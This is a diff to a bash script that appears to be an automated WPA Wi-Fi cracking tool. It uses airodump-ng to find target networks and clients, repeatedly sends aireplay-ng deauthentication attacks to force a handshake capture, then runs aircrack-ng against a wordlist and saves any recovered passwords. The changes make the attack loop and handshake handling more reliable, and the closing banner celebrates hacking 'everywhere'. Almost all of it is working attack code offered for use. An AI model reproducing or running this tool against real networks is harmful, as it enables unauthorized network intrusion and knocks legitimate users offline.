@@ -18,13 +18,14 @@ fi
 ################## SHORTCUTS/STUFFS ##########################
 
 # Air family
-deauthtime=999
+deauthtime=15
 mkdir -p handshakes
+mkdir -p passwords
 function airodumpall {
-	xterm -title "FIND YOUR TARGET" -e airodump-ng -a --encrypt WPA $nic -w target -o kismet
+	xterm -title "FIND YOUR TARGET" $CENTER -e airodump-ng -a --encrypt WPA $nic -w target -o kismet
 }
 
-function airodumpgetclients {
+function airodumpscanclients {
 	xterm -title "SCANNING $networkname NETWORK " $TOPRIGHTBIG -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name --output-format csv,cap $nic &
 }
 
@@ -40,8 +41,11 @@ function killeverybody {
 }
 
 function getclients {
+nr=0
+	while [ $nr = 0 ]; do
 	cat $name-01.csv | awk 'NR==6,NR==11' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
 	nr=$(cat $mac | wc -l)
+	done
 }
 
 # Time for most functions
@@ -145,6 +149,7 @@ function setresolution {
                 BOTTOMRIGHT="-geometry 75x12-0-0"
                 TOPLEFTBIG="-geometry 91x42+0+0"
                 TOPRIGHTBIG="-geometry 83x26-0+0"
+		CENTER="-geometry 100x30+650+300"
         }
 
         function resB {
@@ -155,6 +160,7 @@ function setresolution {
                 BOTTOMRIGHT="-geometry 74x20-0-0"
                 TOPLEFTBIG="-geometry 100x52+0+0"
                 TOPRIGHTBIG="-geometry 74x30-0+0"
+		CENTER="-geometry 100x100+50+50"
         }
         function resC {
 
@@ -164,6 +170,7 @@ function setresolution {
                 BOTTOMRIGHT="-geometry 109x20-0-0"
                 TOPLEFTBIG="-geometry  100x52+0+0"
                 TOPRIGHTBIG="-geometry 109x30-0+0"
+		CENTER="-geometry 100x100+50+50"
         }
         function resD {
                 TOPLEFT="-geometry 110x35+0+0"
@@ -172,6 +179,8 @@ function setresolution {
                 BOTTOMRIGHT="-geometry 99x30-0-0"
                 TOPLEFTBIG="-geometry 110x72+0+0"
                 TOPRIGHTBIG="-geometry 99x40-0+0"
+		CENTER="-geometry 100x100+50+50"
+
         }
         function resE {
                 TOPLEFT="-geometry 130x43+0+0"
@@ -180,6 +189,8 @@ function setresolution {
                 BOTTOMRIGHT="-geometry 132x35-0-0"
                 TOPLEFTBIG="-geometry 130x85+0+0"
                 TOPRIGHTBIG="-geometry 132x48-0+0"
+		CENTER="-geometry 100x100+50+50"
+
         }
         function resF {
                 TOPLEFT="-geometry 100x17+0+0"
@@ -188,6 +199,8 @@ function setresolution {
                 BOTTOMRIGHT="-geometry 90x20-0-0"
                 TOPLEFTBIG="-geometry  100x70+0+0"
                 TOPRIGHTBIG="-geometry 90x27-0+0"
+		CENTER="-geometry 100x100+50+50"
+
 	}
 
 detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
@@ -287,8 +300,8 @@ rm -rf auxfile*
 rm -rf $name-01.kismet.csv
 name=$networkname"_"$bssidtarget
 # If it found a useful handshake, advance some steps.
-	if [ -f $name-handshake.cap ]; then
-		if `./handshakes/aircrack-ng $name-handshake.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
+	if [ -f ./handshakes/$name-handshake.cap ]; then
+		if `aircrack-ng ./handshakes/$name-handshake.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
 			ESPSCN
 		else		
 			echo -e "\n# Handshake for this network found at: #"
@@ -296,60 +309,46 @@ name=$networkname"_"$bssidtarget
 			echo -e "\n# Use it? [y/n] #"
 			read opt
 				if [ $opt = "y" ] || [ $opt = "Y" ]; then
-					mv $name-handshake.cap $name-01.cap
 					WORDLIST
 				fi	
 		fi
 	fi
-ESPSCN
 }
 
 # 4) Scan especific network to get clients
 function ESPSCN {
 # Start airodump at the target 
-airodumpgetclients
-airodumpgetclientsPID=$!
-echo -e "\n Looking for $networname mac clients..."
+airodumpscanclients
 mac=$name.lst
 	# Wait untils csv to be generated
 	while [ ! -f $name-01.csv ]; do
 		:
 	done
-		# Filter mac clients
-		nr=0
-		while [ $nr = 0 ]; do
-			getclients
-		done
 ATTAIR
 }
 
-# 5) Attack using aireplay-ng
+# 5) Attack network using aireplay-ng
 function ATTAIR {
 echo -e "\n# 3) Scanning $networkname to get the HANDSHAKE. #"
 # Attack clients host until find handshake packet
-i=1
-	while [ $i -le $nr ]; do
-		bssidclient=$(awk -v var=$i 'NR==var' $mac)
-		deauthesp
-		sleep 2
-		let i=i+1
-		# Check if handshake is corrupted or with no password
-		if `aircrack-ng $name-01.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
-			:
-		else
-			let i=nr+1
-		fi
-		# Last loop, if didn't work, get more clients (if exist) and restart...
-		if [ $i -eq $nr ]; then
-			getclients
-			let i=1
-		fi
+	while `aircrack-ng $name-01.cap | egrep -q '0 handshake|0 packets|No networks' &>/dev/null` ; do
+		getclients	
+		while [ $nr -gt 0 ]; do
+			bssidclient=$(awk -v var=$nr 'NR==var' $mac)
+			deauthesp
+			let nr=nr-1
+			sleep 5
+		done
 	done
+# Clean handshake packet and erase the behavior
+	wpaclean ./handshakes/$name-handshake.cap ./handshakes/$name-01.cap &> /dev/null
+	rm -rf ./handshakes/$name-01.cap
 # Finish useless process
-killeverybody
+	mv $name-01.cap ./handshakes
+	killeverybody
 # Delete MAC clients table if all right
-rm -rf $mac
-WORDLIST
+	rm -rf $mac
+	WORDLIST
 }
 
 # 6) Search wordlist and verify if don't exist
@@ -373,18 +372,19 @@ AIRCRACK
 
 # 7) Decryptograph the password
 function AIRCRACK {
-# Clean handshake packet
-wpaclean $name-handshake.cap $name-01.cap &> /dev/null
-# Move handshake file to its folder
-mv $name-handshake.cap ./handshakes
-rm -rf $name-01.cap
 # Start the wordlist method attack
 aircrack-ng ./handshakes/$name-handshake.cap -w $path | tee $name-passwd.txt
-cat $name-passwd.txt | grep "KEY FOUND" | awk 'NR==1{print $4}' > $name-password.txt
-rm -rf $name-passwd.txt
-## Notice if sucess or not
+# Get the password name if works
+	if `cat $name-passwd.txt | grep -q "KEY FOUND"` ; then
+		cat $name-passwd.txt | grep "KEY FOUND" | awk 'NR==1{print $4}' > $name-password.txt
+		mv $name-password.txt passwords/
+		rm -rf $name-passwd.txt
+	else
+		rm -rf $name-passwd.txt
+	fi
+# Notice if sucess or not
 	if [ -s $name-password.txt ]; then
-		echo -e "\n# Sucess !! The password is: ${RED}`cat $name-password.txt`${NC} !!!\n"
+		echo -e "\n# Sucess !! The password is: ${RED} `cat $name-password.txt` ${NC} !!! #\n"
 	else
 		echo -e "\n# Sad news but... This wordlist haven't the password =/... Try again with a new one? [y/n] #"
 		read opt 2>/dev/null
@@ -393,11 +393,9 @@ rm -rf $name-passwd.txt
 		else
 			END
 		fi			
-
 	fi	
-
-echo "To finish, press ENTER..."
-read enter
+# To prevent that aircrack-ng finish the script by itfself
+read -p "# To finish, press ENTER... #"
 END
 }
 
@@ -409,7 +407,10 @@ if iwconfig 2> /dev/null | grep Monitor &>/dev/null; then
 fi
 sleep $st
 echo "[+] Deleting jerk files if exist..."
-rm -rf $name-01.csv
+rm -rf $name-01.csv &>/dev/null
+rm -rf $name-01.cap &>/dev/null
+rm -rf $name.lst &>/dev/null
+rm -rf target-0*
 sleep $st
 echo "[+] Restarting network services..."
 service NetworkManager restart
@@ -417,8 +418,8 @@ service networking restart
 sleep $st
 echo "[+] Thanks for using!"
 sleep $st
-echo -e "\n############################################################"
-echo -e "##	${GREEN}ENJOY THE HACKING, I N V A S I T EVERYWHERE${NC}	  ##"
+echo -e "\n${NC}############################################################"
+echo -e "##	${GREEN}ENJOY THE HACKING, ${RED}I N V A S I T ${GREEN}EVERYWHERE${NC}	  ##"
 echo "############################################################"
 exit
 }
